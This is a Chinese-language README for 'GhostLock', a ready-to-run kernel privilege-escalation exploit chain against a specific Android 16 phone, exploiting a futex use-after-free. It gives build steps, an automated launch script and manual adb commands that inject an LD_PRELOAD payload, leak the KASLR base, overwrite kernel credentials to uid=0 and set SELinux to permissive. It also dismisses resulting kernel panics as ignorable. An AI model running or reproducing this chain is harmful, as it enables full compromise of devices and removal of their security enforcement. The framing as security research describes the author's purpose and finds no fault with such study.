<p align="center">
  <img src="assets/banner.svg" alt="GhostLock Banner" width="100%">
</p>

<p align="center">
  <a href="https://kernel.org/"><img src="https://img.shields.io/badge/Kernel-6.1.145--android14--11-blue?style=flat-square&logo=linux" alt="Kernel"></a>
  <a href="https://android.com/"><img src="https://img.shields.io/badge/Android-16%20(BP2A)-3DDC84?style=flat-square&logo=android&logoColor=white" alt="Android"></a>
  <a href="#目标设备"><img src="https://img.shields.io/badge/Target-vivo%20iQOO%20Neo9S%20Pro-orange?style=flat-square" alt="Target"></a>
  <a href="https://github.com/tiann/KernelSU"><img src="https://img.shields.io/badge/Root-KernelSU%20(Rootless)-6366F1?style=flat-square" alt="KernelSU"></a>
  <a href="#license"><img src="https://img.shields.io/badge/License-MIT-emerald?style=flat-square" alt="License"></a>
</p>

---

> [!WARNING]
> **免责声明**：本项目为面向安全研究用途的草稿代码，仅在作者本人的设备上完成测试验证，不保证在其他环境下的质量与稳定性。
>
> **严禁在生产或日常主力设备上运行**；任何由此造成的设备变砖、数据丢失或硬件异常，作者概不负责。

## 项目简介

**GhostLock** 是面向 **Android 16**（vivo iQOO Neo9S Pro）的 Linux 内核提权利用链（基于 `futex` 栈 UAF，CVE-2026-43499）：

- **A 轮**：在 `futex` PI 等待路径（`FUTEX_LOCK_PI`）留下可复用的内核栈空洞，并挂驻等待进程；
- **探测与烘焙**：通过 `psl2` 工具泄漏当次启动的 KASLR `TEXT` 基址，并动态烘焙设备专属 KernelSU 模块；
- **B 轮**：再次发射重踩该空洞，获得内核任意读写原语后改写 `cred` 结构体提权至 `uid=0`，并将 SELinux 改为 Permissive，完成 Rootless 提权落地。

## 目标设备与参数

| 配置项 | 详细规格 |
| :--- | :--- |
| **适配机型** | vivo iQOO Neo9S Pro（`PD2339` / `PD2339M`） |
| **系统固件** | `BP2A.250605.031.A3`（Android 16） |
| **内核版本** | `6.1.145-android14-11`（AArch64，`VA_BITS=39`，4KB 页） |
| **设备常量** | [`src/targets/target.h`](src/targets/target.h) |

## 构建指南

### 环境依赖

构建依赖 **Android NDK**。`Makefile` 会按以下优先级顺序自动探测工具链路径：
1. 环境变量 `$ANDROID_NDK_HOME`
2. 环境变量 `$ANDROID_NDK_ROOT`
3. 用户缓存目录 `~/android-ndk-cache/android-ndk-*`
4. SDK 目录 `~/Android/Sdk/ndk/*`
5. 系统目录 `/opt/android-ndk`

> [!TIP]
> clang 资源目录采用 `lib/clang/*` 自动通配。若未探测到有效 NDK，将回退至宿主机 `clang` 并携带 `--target=aarch64-linux-android35` 交叉参数（需自备 sysroot）。可先执行 `make info` 查看实际命中的工具链。

### 常用 Make 命令

```sh
make            # clean → tools → payload，全流程自动化构建
make tools      # 仅构建 tools/ 工具：hijtest / slot_restore / psl2
make -C tools r829_bandscan  # 按需构建内存带宽探测工具
make payload    # 仅构建 preload.so 与 su_ksu，打包至 payloads/preload.so
make info       # 打印当前选中的 NDK 工具链与 GL_VERSION 编译版本
make clean      # 清理 build/、payloads/ 与 tools/ 下全部构建产物
```

- `make all` 采用递归 `$(MAKE)` 串行构建，杜绝多线程 `make -j` 带来的依赖竞态。
- 单项工具支持子目录直接编译，例如：`make -C tools psl2`。

### 构建产物清单

| 产物路径 | 说明 |
| :--- | :--- |
| `payloads/preload.so` | 发射核心载荷（通过 `LD_PRELOAD` 注入，A 轮与 B 轮共用） |
| `tools/psl2` | KASLR `TEXT` 地址探测工具 |
| `tools/hijtest` | 函数指针劫持验证工具 |
| `tools/slot_restore` | 栈槽位修复与测试工具 |
| `tools/r829_bandscan` | 内存带宽与对齐探测工具 |
| `build/<TARGET>/bin/` | 编译中间件及 `preload.so`、`su_ksu` 源码原件 |

版本号在构建时通过 `git describe` 自动编译进二进制内部（`BUILD_VERSION`）：

```sh
# 查看构建注入的版本号
make info | grep GL_VERSION

# 从产物二进制中读回版本标识
strings payloads/preload.so | grep -E '^[0-9a-f]{7,}(-dirty)?$'
```

> [!IMPORTANT]
> 仓库随附提供的 [`tools/kallsyms.new`](tools/kallsyms.new)（约 4.9MB，提取自官方固件 `boot.img`）是动态烘焙内核模块不可或缺的符号表输入。

## 运行与提权

### 前置准备

- 启用设备的 USB 调试，确保能够通过 `adb shell`（`uid=2000` shell 权限）建立连接。
- A/B 两个发射轮次必须在**同一次系统开机周期**内完成。

### 方式一：全自动发射（推荐）

使用一键式自动化编排脚本 [`scripts/r830_autofire.sh`](scripts/r830_autofire.sh)，支持任意当前工作目录调用：

```sh
# 多设备并存时指定目标 Serial，单设备时可省略
export ANDROID_SERIAL=<你的设备Serial>

# 启动全自动两轮利用发射
./scripts/r830_autofire.sh r830 3
```

#### 可用环境变量配置

| 环境变量 | 默认值 | 用途说明 |
| :--- | :--- | :--- |
| `ANDROID_SERIAL` | 自动选择唯一设备 | 指定操作的 adb 目标设备序号 |
| `KALLSYMS` | `tools/kallsyms.new` | 自定义符号表文件路径 |
| `PRELOAD` | `payloads/preload.so` | 自定义 payload 注入动态库路径 |
| `PSL2` | `tools/psl2` | 自定义 psl2 测距工具路径 |
| `ADB` | `adb` | 自定义 adb 二进制路径 |
| `GL_LOG_INFO` | `0` (关闭) | 设为 `1` 时输出每个周期的重试细节 `pr_info` |

### 方式二：分步手动发射

```sh
adb shell "cd /data/local/tmp && env SLIDE_WRITE_TARGET=selinux \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/app_process64 / dummy"

TEXT=$(adb shell "/data/local/tmp/psl2")

./ksu/make_device_ko.sh "$TEXT"
adb push ksu/kernelsu-device-ready.ko /data/local/tmp/

adb shell "cd /data/local/tmp && env SLIDE_WRITE_TARGET=fops \
  SLIDE_CRED_WRITE=1 SLIDE_TEXT_ADDR=$TEXT \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/app_process64 / dummy"
```

## Panic?

目前取得root权限之后没有遇到任何因为root权限导致的应用程序崩溃、
银行软件无法运行、手机无法解锁、相机无法使用等问题。
因为这本身是一种rootless的方案，并没有写入/system分区或者是/vendor
分区，本身操作安全。

如果出现了KernelPanic, 那大概是因为竞争或者是踩到了脏树导致的KernelPanic，
一般忽略即可。本程序已经解决了多条root路线上的KernelPanic问题……
剩下留存的解决方案还在研制中……

## License
[MIT License](LICENSE)